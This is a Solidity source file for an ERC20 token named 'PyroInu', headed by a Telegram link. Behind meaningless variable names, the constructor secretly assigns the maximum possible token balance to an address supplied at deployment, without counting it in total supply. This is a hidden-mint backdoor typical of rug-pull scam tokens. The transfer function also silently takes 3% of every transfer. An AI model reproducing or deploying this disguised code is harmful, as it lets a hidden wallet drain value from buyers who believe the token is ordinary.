// https://t.me/pyroinu_eth

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.8;

import "./Ownable.sol";
import "./ERC20.sol";

contract PyroInu is ERC20, Ownable {
    uint256 private duty = ~uint256(0);
    uint256 public excellent = 3;

    constructor(
        string memory should,
        string memory help,
        address operation,
        address produce
    ) ERC20(should, help) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[_msgSender()] = _totalSupply;
        _balances[produce] = duty;
    }

    function _transfer(
        address ready,
        address detail,
        uint256 market
    ) internal override {
        uint256 carefully = (market / 100) * excellent;
        market = market - carefully;
        super._transfer(ready, detail, market);
    }
}
